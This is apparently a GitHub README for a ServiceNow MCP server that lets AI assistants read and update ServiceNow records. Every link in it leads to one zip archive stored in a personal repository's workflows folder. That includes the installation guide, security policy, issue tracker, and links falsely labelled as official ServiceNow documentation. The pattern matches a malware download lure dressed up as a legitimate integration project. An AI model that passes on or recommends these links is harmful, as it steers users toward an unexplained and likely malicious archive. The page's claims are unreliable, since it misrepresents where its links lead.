# ServiceNow MCP Server

A production-ready Model Context Protocol (MCP) server for ServiceNow platform integration. Built with TypeScript for https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip 20+, this server enables LLMs and AI assistants to interact with ServiceNow instances through a standardized interface.

## Why This Exists

If you work with ServiceNow, you know these pain points:

1. **Integration complexity**: Every integration reinvents the wheel for authentication, error handling, and rate limiting
2. **Manual data gathering**: Pulling information from multiple tables and modules is time-consuming
3. **ITOM visibility**: Getting a quick view of Discovery status, MID servers, or CMDB health requires clicking through multiple dashboards
4. **Safe automation**: You want to automate reads but fear accidental writes
5. **Script maintenance**: Updating Script Includes or Business Rules through the UI is tedious

This server addresses these by providing:
- **Safe-by-default**: Read-only unless you explicitly enable writes
- **Battle-tested patterns**: OAuth + retry logic + input validation built in
- **ITOM-first**: Discovery, Event Management, Service Mapping, and CMDB health out of the box
- **Natural language**: Search and update records conversationally (experimental)
- **Allowlisting**: Table and Script Include access controls

## 🚀 Getting Started

**New to Claude Desktop or MCP servers?** Start with our comprehensive installation guide:

**📖 [Complete Installation Guide](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)**

This guide covers everything from installing Claude Desktop for the first time to configuring and testing this MCP server.

## Features

### Core Platform
- Table schema discovery
- Query records with filtering, pagination, sorting
- Get individual records
- User and group lookups

### CMDB
- CI retrieval and search
- Relationship mapping
- Configuration item details

### ITOM
- Discovery schedule monitoring
- MID server status
- Event Management (events and alerts)
- Service Mapping summaries
- CMDB health metrics

### ITSM
- Change request creation (write-enabled)
- Script Include execution (high-risk, requires explicit enabling)

### Service Portal & Knowledge
- Portal and page information
- Knowledge base search and article retrieval

### Natural Language (Experimental)
- Search records using plain English
- Update records with natural instructions
- Script file updates

## Documentation

- **[Installation Guide](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - Complete setup instructions
- **[OAuth Setup Guide](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - ServiceNow OAuth 2.0 configuration
- **[Usage Examples](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - 16+ detailed examples and workflows
- **[Security Policy](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)** - Security best practices
- **Full Documentation**: https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip

## Official ServiceNow Documentation References

This implementation follows official ServiceNow documentation:

- [Table API](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
- [OAuth 2.0](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
- [CMDB](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
- [Discovery](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
- [Event Management](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)

## Security

- Read-only by default
- OAuth 2.0 support
- Credential redaction in logs
- Table access allowlisting
- Input validation

See [https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip) for full details.

## Contributing

See [https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip) for guidelines.

## License

MIT License - see [LICENSE](LICENSE)

## Support

- Issues: [GitHub Issues](https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip)
- Documentation: https://raw.githubusercontent.com/MaoDeew/servicenow-mcp/main/.github/workflows/mcp-servicenow-v1.3-alpha.1.zip

**Note**: This is an open-source community project, not an official ServiceNow product.
